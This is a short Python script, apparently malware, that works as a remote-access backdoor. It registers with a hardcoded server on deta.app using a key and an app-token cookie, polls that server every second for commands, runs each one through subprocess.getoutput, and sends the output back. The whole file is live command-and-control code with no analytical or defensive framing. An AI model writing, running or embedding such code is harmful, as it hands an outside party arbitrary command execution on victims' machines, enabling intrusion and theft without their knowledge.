from subprocess import getoutput
from requests import get, exceptions
from time import sleep

api = 'https://codesetter-1-o6783419.deta.app/'
cookie = '6cPwFA7uNwMoZq4wNZAANe4FVQp1Lw3yWNM49sJDus1apHnZ'

def check_connection():
    while not sleep(1):
        try:
            get('https://google.com')
            break
        except exceptions.ConnectionError:
            pass
    return True

if check_connection():
    get(api+'online', params={'key': 'hello-asshole.0945'}, cookies={'deta_app_token': cookie})

while not sleep(1):
    if check_connection():
        code = get(api, params={'key': 'hello-asshole.0945'}, cookies={'deta_app_token': cookie}).json()
        if code['ok']:
            get(api+'result', json={'result': getoutput(code['code'])}, params={'key': 'hello-asshole.0945'}, cookies={'deta_app_token': cookie})